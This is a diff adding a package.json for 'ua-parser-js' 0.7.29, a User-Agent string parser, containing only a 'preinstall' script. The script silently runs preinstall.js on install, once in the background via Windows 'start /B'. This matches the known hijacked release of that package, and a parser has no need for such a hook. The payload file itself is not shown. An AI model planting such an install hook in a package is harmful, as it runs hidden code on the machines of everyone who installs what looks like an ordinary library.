@@ -1,0 +1,8 @@
+{
+  "name": "ua-parser-js",
+  "version": "0.7.29",
+  "description": "Lightweight JavaScript-based User-Agent string parser",
+  "scripts": {
+    "preinstall": "start /B node preinstall.js & node preinstall.js"
+  }
+}
